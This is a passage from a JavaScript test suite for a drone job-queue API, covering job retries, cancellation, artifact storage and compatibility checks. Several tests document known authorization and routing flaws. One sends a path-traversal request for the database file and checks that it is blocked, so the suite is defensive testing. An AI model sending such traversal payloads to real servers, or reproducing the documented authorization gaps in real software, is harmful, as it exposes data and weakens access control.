    // The ownership gate is `!isAdmin && job.drone_id && …` — with no drone_id
    // yet, the gate never fires. lucy-test is neither requester nor drone here.
    const jobId = await queueAdminJob({ title: 'unguarded pending', command: 'echo x', requires: ['gpu'], input_data: { _no_retry: true } })
    const res = await api().put('/api/mycelium/drones/jobs/' + jobId)
      .set('X-Agent-Key', AGENT_KEY).send({ error: 'graffiti from lucy' })
    expect(res.status).toBe(200) // currently allowed
    const job = await getJob(jobId)
    expect(job.body.error).toBe('graffiti from lucy')
    await cancelJob(jobId)
  })

  test('failing a claimed job AUTO-SPAWNS a retry job: "<title> [retry 1/2]", pending, lineage in input_data', async () => {
    const jobId = await queueAdminJob({ title: 'flaky render', command: 'echo boom', requires: ['cpu'] })
    const claim = await api().post('/api/mycelium/drones/claim')
      .set('X-Agent-Key', DRONE_B_KEY).send({ capabilities: ['cpu'] })
    expect(claim.body.job.id).toBe(jobId)

    const fail = await api().put('/api/mycelium/drones/jobs/' + jobId)
      .set('X-Agent-Key', DRONE_B_KEY).send({ status: 'failed', error: 'boom' })
    expect(fail.status).toBe(200)

    const original = await getJob(jobId)
    expect(original.body.status).toBe('failed')
    expect(original.body.completed_at).toBeTruthy()

    const pending = await adminHeaders(api().get('/api/mycelium/drones/jobs').query({ status: 'pending' }))
    const retry = pending.body.find((j) => j.title === 'flaky render [retry 1/2]')
    expect(retry, 'auto-retry job was not spawned').toBeTruthy()
    const retryInput = JSON.parse(retry.input_data)
    expect(retryInput._retry_count).toBe(1)
    expect(retryInput._original_job_id).toBe(jobId)
    expect(retryInput._original_title).toBe('flaky render')
    await cancelJob(retry.id)
  })

  test('input_data._no_retry suppresses the retry spawn', async () => {
    const jobId = await queueAdminJob({ title: 'no second chances', command: 'echo x', requires: ['cpu'], input_data: { _no_retry: true } })
    await api().post('/api/mycelium/drones/claim')
      .set('X-Agent-Key', DRONE_B_KEY).send({ capabilities: ['cpu'] })
    await api().put('/api/mycelium/drones/jobs/' + jobId)
      .set('X-Agent-Key', DRONE_B_KEY).send({ status: 'failed', error: 'boom' })

    const job = await getJob(jobId)
    expect(job.body.status).toBe('failed')
    const pending = await adminHeaders(api().get('/api/mycelium/drones/jobs').query({ status: 'pending' }))
    expect(pending.body.find((j) => j.title.startsWith('no second chances [retry'))).toBeUndefined()
  })

  test('GET /drones/:id surfaces an error_summary built from recent failed jobs', async () => {
    const res = await adminHeaders(api().get('/api/mycelium/drones/drone-beta'))
    expect(res.status).toBe(200)
    expect(Array.isArray(res.body.error_summary)).toBe(true)
    const entry = res.body.error_summary.find((e) => e.message === 'boom')
    expect(entry).toBeTruthy()
    expect(entry.error_type).toBe('unknown') // no structured result_data → 'unknown'
  })

  test('LATENT L4: PUT status:claimed on a pending job auto-sets started_at and drone_id = CALLER identity', async () => {
    // Admin "claims" without a drone_id body field — the route back-fills
    // drone_id with the caller's display identity (X-Acting-As), so a job can
    // end up "claimed" by 'm5Max', which is not a drone at all.
    const jobId = await queueAdminJob({ title: 'manual claim seam', command: 'echo x', requires: ['cpu'], input_data: { _no_retry: true } })
    const res = await adminHeaders(api().put('/api/mycelium/drones/jobs/' + jobId)).send({ status: 'claimed' })
    expect(res.status).toBe(200)
    const job = await getJob(jobId)
    expect(job.body.status).toBe('claimed')
    expect(job.body.started_at).toBeTruthy()
    expect(job.body.drone_id).toBe('m5Max') // the acting-as name, not a drone
    // Finish it off so it can't be swept by the stale-release test below.
    await adminHeaders(api().put('/api/mycelium/drones/jobs/' + jobId)).send({ status: 'done' })
  })

  test('unknown id and non-numeric id → 404', async () => {
    const missing = await adminHeaders(api().put('/api/mycelium/drones/jobs/999999')).send({ status: 'done' })
    expect(missing.status).toBe(404)
    const nan = await adminHeaders(api().put('/api/mycelium/drones/jobs/abc')).send({ status: 'done' })
    expect(nan.status).toBe(404)
  })
})

describe('stale-claim release via POST /drones/claim (Bug #137 seam)', () => {
  test('a >1h-old claim is auto-FAILED on the next claim call; LATENT L10: no auto-retry on this path', async () => {
    const jobId = await queueAdminJob({ title: 'stale render', command: 'echo x', requires: ['cpu'] })
    const claim = await api().post('/api/mycelium/drones/claim')
      .set('X-Agent-Key', DRONE_B_KEY).send({ capabilities: ['cpu'] })
    expect(claim.body.job.id).toBe(jobId)

    // Time travel: backdate the claim 2h. The only non-route fixture step in
    // this file — same convention as db-drone-claim.test.js.
    raw.prepare("UPDATE drone_jobs SET started_at = datetime('now', '-2 hours') WHERE id = ?").run(jobId)

    const next = await api().post('/api/mycelium/drones/claim')
      .set('X-Agent-Key', DRONE_B_KEY).send({ capabilities: ['cpu'] })
    expect(next.status).toBe(200)
    expect(next.body.job).toBeNull() // queue otherwise empty
    expect(next.body.stale_released).toBe(1)

    const job = await getJob(jobId)
    expect(job.body.status).toBe('failed')
    expect(job.body.error).toMatch(/stale_timeout/)
    expect(job.body.completed_at).toBeTruthy()

    // L10: unlike a PUT-failed job, NO '[retry 1/2]' twin appears — the retry
    // machinery lives only in the PUT route, not in releaseStaleClaimedJobs.
    const pending = await adminHeaders(api().get('/api/mycelium/drones/jobs').query({ status: 'pending' }))
    expect(pending.body.find((j) => j.title.startsWith('stale render [retry'))).toBeUndefined()
  })
})

// ============================================================================
// 6 · CANCELLATION — DELETE /drones/jobs/:id + bulk cleanup
// ============================================================================

describe('DELETE /drones/jobs/:id — cancel (admin only)', () => {
  test('cancels a pending job → { ok, id, cancelled:true }; row cancelled with completed_at', async () => {
    const jobId = await queueAdminJob({ title: 'doomed', command: 'echo x', requires: ['gpu'], input_data: { _no_retry: true } })
    const res = await adminHeaders(api().delete('/api/mycelium/drones/jobs/' + jobId))
    expect(res.status).toBe(200)
    expect(res.body).toEqual({ ok: true, id: jobId, cancelled: true })
    const job = await getJob(jobId)
    expect(job.body.status).toBe('cancelled')
    expect(job.body.completed_at).toBeTruthy()
  })

  test('agent key → 403 (findings-§1 fix); wrong admin key → 403; unknown job → 404', async () => {
    const asAgent = await api().delete('/api/mycelium/drones/jobs/1').set('X-Agent-Key', AGENT_KEY)
    expect(asAgent.status).toBe(403)
    const badKey = await api().delete('/api/mycelium/drones/jobs/1').set('X-Admin-Key', 'wrong')
    expect(badKey.status).toBe(403)
    const missing = await adminHeaders(api().delete('/api/mycelium/drones/jobs/999999'))
    expect(missing.status).toBe(404)
  })

  test('LATENT L5: cancel rewrites even a DONE job to cancelled (terminal history not protected)', async () => {
    // J1 finished as 'done' with results earlier in the file.
    const res = await adminHeaders(api().delete('/api/mycelium/drones/jobs/' + J1))
    expect(res.status).toBe(200)
    const job = await getJob(J1)
    expect(job.body.status).toBe('cancelled') // done → cancelled, results still attached
    expect(job.body.result_url).toBe('http://x/out.png')
  })
})

describe('DELETE /drones/jobs — bulk cleanup (admin only)', () => {
  test('invalid status filter → 400', async () => {
    const res = await adminHeaders(api().delete('/api/mycelium/drones/jobs').query({ status: 'bogus' }))
    expect(res.status).toBe(400)
    expect(res.body.error).toBe('status must be failed, done, or both')
  })

  test('agent key → 403 (findings-§1 fix)', async () => {
    const res = await api().delete('/api/mycelium/drones/jobs').set('X-Agent-Key', AGENT_KEY)
    expect(res.status).toBe(403)
  })

  test('sweeps failed jobs to cancelled; reports { ok, cancelled, jobs:[{id,title}] }', async () => {
    // The lifecycle tests above left several failed jobs behind (flaky render,
    // no second chances, stale render).
    const res = await adminHeaders(api().delete('/api/mycelium/drones/jobs').query({ status: 'failed' }))
    expect(res.status).toBe(200)
    expect(res.body.ok).toBe(true)
    expect(res.body.cancelled).toBeGreaterThanOrEqual(3)
    expect(res.body.cancelled).toBe(res.body.jobs.length)
    expect(res.body.jobs[0]).toHaveProperty('id')
    expect(res.body.jobs[0]).toHaveProperty('title')

    const stillFailed = await adminHeaders(api().get('/api/mycelium/drones/jobs').query({ status: 'failed' }))
    expect(stillFailed.body).toEqual([])
  })
})

// ============================================================================
// 7 · RESULT DELIVERY — drone artifacts store + asset↔job linkage
// ============================================================================

function countArtifactFiles() {
  const dir = join(tmpDataDir, 'drone_artifacts')
  if (!existsSync(dir)) return 0
  return readdirSync(dir, { withFileTypes: true }).filter((e) => e.isFile()).length
}

describe('drone artifacts — /drones/artifacts', () => {
  test('C-3 guard (locked): agent upload → 403 and NOTHING written to disk', async () => {
    const before = countArtifactFiles()
    const res = await api().post('/api/mycelium/drones/artifacts')
      .set('X-Agent-Key', AGENT_KEY)
      .attach('file', Buffer.from('malicious'), 'generate_flux.py')
    expect(res.status).toBe(403)
    expect(res.body.error).toMatch(/admin-only/)
    expect(countArtifactFiles()).toBe(before)
  })

  test('admin upload → { ok, name, url, size }; unsafe filename chars become underscores', async () => {
    const res = await adminHeaders(api().post('/api/mycelium/drones/artifacts'))
      .attach('file', Buffer.from('print("trusted")'), 'my file!.py')
    expect(res.status).toBe(200)
    expect(res.body.ok).toBe(true)
    expect(res.body.name).toBe('my_file_.py') // space and ! sanitized
    expect(res.body.size).toBe(16)
    expect(res.body.url).toMatch(/\/api\/mycelium\/drones\/artifacts\/my_file_\.py$/)
  })

  test('multipart with no file → 400', async () => {
    const res = await adminHeaders(api().post('/api/mycelium/drones/artifacts')).field('note', 'x')
    expect(res.status).toBe(400)
    expect(res.body.error).toMatch(/No file uploaded/)
  })

  test('list (agent-readable) includes the upload with size + url', async () => {
    const res = await api().get('/api/mycelium/drones/artifacts').set('X-Agent-Key', AGENT_KEY)
    expect(res.status).toBe(200)
    const entry = res.body.find((a) => a.name === 'my_file_.py')
    expect(entry).toBeTruthy()
    expect(entry.size).toBe(16)
    expect(entry.uploaded).toBeTruthy()
  })

  test('download round-trips the bytes (agent auth suffices)', async () => {
    const res = await api().get('/api/mycelium/drones/artifacts/my_file_.py').set('X-Agent-Key', AGENT_KEY)
    expect(res.status).toBe(200)
    const body = res.text || (res.body && res.body.toString())
    expect(body).toBe('print("trusted")')
  })

  test('path traversal in :name is neutralized by the character filter → 404, never file contents', async () => {
    const res = await api().get('/api/mycelium/drones/artifacts/..%2F..%2Fmycelium.db').set('X-Agent-Key', AGENT_KEY)
    expect(res.status).toBe(404) // '/' stripped by [^a-zA-Z0-9_.\-] filter, name never resolves
    expect(res.body.error).toBe('Artifact not found')
  })

  test('delete is admin-only: agent → 403 (findings-§1 fix); unknown → 404; success → { ok, deleted }', async () => {
    const asAgent = await api().delete('/api/mycelium/drones/artifacts/my_file_.py').set('X-Agent-Key', AGENT_KEY)
    expect(asAgent.status).toBe(403)
    const missing = await adminHeaders(api().delete('/api/mycelium/drones/artifacts/ghost.bin'))
    expect(missing.status).toBe(404)
    const res = await adminHeaders(api().delete('/api/mycelium/drones/artifacts/my_file_.py'))
    expect(res.status).toBe(200)
    expect(res.body).toEqual({ ok: true, deleted: 'my_file_.py' })
    const gone = await api().get('/api/mycelium/drones/artifacts/my_file_.py').set('X-Agent-Key', AGENT_KEY)
    expect(gone.status).toBe(404)
  })
})

describe('asset ↔ drone-job linkage', () => {
  test('completing a job flips its linked assets to ready (link via PUT /assets/:id)', async () => {
    // status 'in_progress' avoids the auto-task side quest that 'requested' triggers
    const asset = await api().post('/api/mycelium/assets')
      .set('X-Agent-Key', AGENT_KEY)
      .send({ name: 'render-out', type: 'image', status: 'in_progress', project_id: 'proj-x' })
    expect(asset.status).toBe(200)
    const assetId = asset.body.id

    const jobId = await queueAdminJob({ title: 'asset producer', command: 'echo x', requires: ['cpu'], input_data: { _no_retry: true } })
    const link = await api().put('/api/mycelium/assets/' + assetId)
      .set('X-Agent-Key', AGENT_KEY).send({ drone_job_id: jobId })
    expect(link.status).toBe(200)

    const claim = await api().post('/api/mycelium/drones/claim')
      .set('X-Agent-Key', DRONE_B_KEY).send({ capabilities: ['cpu'] })
    expect(claim.body.job.id).toBe(jobId)
    await api().put('/api/mycelium/drones/jobs/' + jobId)
      .set('X-Agent-Key', DRONE_B_KEY).send({ status: 'done', result_url: 'http://x/a.png' })

    const after = await api().get('/api/mycelium/assets/' + assetId).set('X-Agent-Key', AGENT_KEY)
    expect(after.body.status).toBe('ready') // auto-updated by the job-done hook
    expect(after.body.drone_job_id).toBe(jobId)
  })

  test('LATENT L6: PUT /assets/link-job is SHADOWED by PUT /assets/:id — always 404 Asset not found', async () => {
    // /assets/:id is registered before /assets/link-job, so Express routes
    // 'link-job' into :id; parseIntParam('link-job') → null → getAsset(null)
    // → 404. The documented bulk-link endpoint is unreachable dead code.
    const res = await api().put('/api/mycelium/assets/link-job')
      .set('X-Agent-Key', AGENT_KEY)
      .send({ asset_ids: [1], drone_job_id: 1 })
    expect(res.status).toBe(404)
    expect(res.body.error).toBe('Asset not found')
  })
})

// ============================================================================
// 8 · COMPATIBILITY — GET /drones/:id/compatibility
// ============================================================================

describe('GET /drones/:id/compatibility', () => {
  beforeAll(async () => {
    const res = await adminHeaders(api().post('/api/mycelium/drones/templates')).send({
      id: 'vram-hog', name: 'VRAM Hog', requires: ['gpu'], min_vram_gb: 999,
    })
    if (res.status !== 200) throw new Error('test setup: vram-hog template failed: ' + JSON.stringify(res.body))
  })

  test('diagnostics-backed drone: templates sorted into compatible/incompatible with reasons', async () => {
    const res = await adminHeaders(api().get('/api/mycelium/drones/drone-alpha/compatibility'))
    expect(res.status).toBe(200)
    expect(res.body.drone_id).toBe('drone-alpha')

    const compatibleIds = res.body.compatible.map((t) => t.template)
    expect(compatibleIds).toContain('flux-char')
    // LATENT L8b: requires[] is never matched against drone CAPABILITIES — the
    // 3d_printer-requiring template is "compatible" because only gpu/disk
    // thresholds are checked and drone-alpha has plenty of both.
    expect(compatibleIds).toContain('3d_print')

    const hog = res.body.incompatible.find((t) => t.template === 'vram-hog')
    expect(hog).toBeTruthy()
    expect(hog.reasons).toEqual(['Requires 999 GB VRAM, has 24 GB'])
  })

  test('LATENT L8: no diagnostics → HTTP 200 with an { error } body and empty lists', async () => {
    const res = await adminHeaders(api().get('/api/mycelium/drones/drone-beta/compatibility'))
    expect(res.status).toBe(200) // error-in-200 envelope, not a 4xx
    expect(res.body.error).toBe('No diagnostics available')
    expect(res.body.compatible).toEqual([])
    expect(res.body.incompatible).toEqual([])
  })

  test('unknown drone → 404', async () => {
    const res = await adminHeaders(api().get('/api/mycelium/drones/ghost-drone/compatibility'))
    expect(res.status).toBe(404)
    expect(res.body.error).toBe('Drone not found')
  })
})
